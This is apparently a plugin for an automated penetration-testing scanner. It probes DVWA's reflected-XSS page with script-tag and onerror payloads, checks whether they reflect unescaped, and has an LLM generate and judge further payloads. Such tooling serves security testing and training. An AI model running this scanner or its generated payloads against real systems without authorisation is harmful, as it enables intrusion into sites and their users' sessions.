import urllib.request
import urllib.parse
import urllib.error
import socket
import re
import time
from typing import Dict, Any
from plugins.base_plugin import BasePlugin
from ai_self_validation import groq_generate_payloads, groq_evaluate_results

class DVWAXSSPlugin(BasePlugin):
    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "DVWA-XSS",
            "name": "DVWA XSS Reflected",
            "cvss_score": 6.1,
            "service": "http",
            "vuln_type": "xss_reflected"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        return service_info.get("service","") in ["http","https"]

    def _send_payload(self, base_url, payload, cookie):
        """Gửi XSS Payload và trích xuất NGỮ CẢNH (Context) phản hồi"""
        try:
            encoded_payload = urllib.parse.quote(payload)
            url = f"{base_url}?name={encoded_payload}"
            
            req = urllib.request.Request(url)
            req.add_header("Cookie", cookie)
            t0 = time.time()
            
            resp = urllib.request.urlopen(req, timeout=5)
            elapsed = round(time.time() - t0, 3)
            body = resp.read().decode('utf-8')
            
            # [LỌC HTML THÔNG MINH - TRÍCH XUẤT CONTEXT]
            # Tìm chính xác vị trí payload xuất hiện trong HTML (kèm 40 ký tự trước/sau để AI đánh giá)
            output = ""
            if payload in body:
                idx = body.find(payload)
                start = max(0, idx - 40)
                end = min(len(body), idx + len(payload) + 40)
                context_str = body[start:end].replace('\n', ' ')
                output = f"[UNESCAPED_HIT] Context: ...{context_str}..."
            elif payload.replace("<", "&lt;") in body:
                output = "[ESCAPED] Payload đã bị WAF/Mã hóa HTML (Safe)."
            else:
                output = "[MISS] Payload không xuất hiện trong response."

            return {"output": output, "response_time": elapsed, "error": None}
            
        except Exception as e:
            return {"output": "", "response_time": -1, "error": str(e)}

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        cookie = context.get("session_cookie","")
        if not cookie:
            return {"status": "PENDING", "evidence": "Chưa có session cookie"}

        url = f"http://{target_ip}:{target_port}/vulnerabilities/xss_r/"
        all_results = []

        initial_payloads = [
            ("<script>alert('XSS')</script>", "Basic Script Tag"),
            ("<img src=x onerror=alert(1)>", "Image Error Event")
        ]

        print(f"      [XSS] PHASE 1: Thử payload từ knowledge base...")
        initial_confirmed = None
        for payload, technique in initial_payloads:
            print(f"      [XSS] [{technique}] Payload: {payload}")
            result = self._send_payload(url, payload, cookie)
            marker_hit = "UNESCAPED_HIT" in result["output"]
            status = "HIT" if marker_hit else "MISS"
            print(f"      [XSS] Response time: {result['response_time']}s | Status: {status}")
            
            all_results.append({
                "phase": "initial", "technique": technique, "payload": payload,
                "output": result["output"], "response_time": result["response_time"], "hit": marker_hit
            })
            if marker_hit and not initial_confirmed:
                initial_confirmed = {"payload": payload, "output": result["output"], "technique": technique}

        if not initial_confirmed:
            return {"status": "FALSE_POSITIVE", "evidence": "Toàn bộ XSS payload ban đầu bị block hoặc mã hóa."}

        print(f"\n      [XSS] PHASE 2: AI Groq suy luận và sinh payload bổ sung...")
        ai_plan = groq_generate_payloads("DVWA-XSS", "http reflected xss", url, initial_confirmed)

        print(f"\n      [XSS] PHASE 2a & 2b: Thực thi payload AI & Kiểm tra Honeypot/WAF...")
        test_payloads = ai_plan.get("confirm_payloads", []) + ai_plan.get("honeypot_payloads", [])
        for p in test_payloads:
            payload, purpose = p.get("payload",""), p.get("purpose","")
            print(f"      [XSS] [AI Test] Payload: {payload}")
            result = self._send_payload(url, payload, cookie)
            hit = "UNESCAPED_HIT" in result["output"]
            if result["output"]: print(f"      [XSS] Output: {result['output']}")
            
            all_results.append({
                "phase": "ai_test", "purpose": purpose, "payload": payload,
                "output": result["output"], "response_time": result["response_time"], "hit": hit
            })

        print(f"\n      [XSS] PHASE 3: AI đánh giá tổng hợp tất cả kết quả...")
        verdict = groq_evaluate_results("DVWA-XSS", all_results, ai_plan.get("honeypot_suspicion","low"))
        
        final_status = verdict.get("verdict","PENDING")
        if final_status == "HONEYPOT_SUSPECTED": final_status = "PENDING"

        valuable_hits = [r for r in all_results if r["hit"]]
        best_hit = valuable_hits[0] if valuable_hits else initial_confirmed

        return {
            "status": final_status,
            "evidence": (
                f"XSS Reflected — AI Self-Validation hoàn tất.\n"
                f"      - Payload tốt nhất   : {best_hit['payload']}\n"
                f"      - Phản hồi thực tế   : {best_hit['output']}\n"
                f"      - AI Reasoning       : {verdict.get('final_reasoning')}"
            )
        }
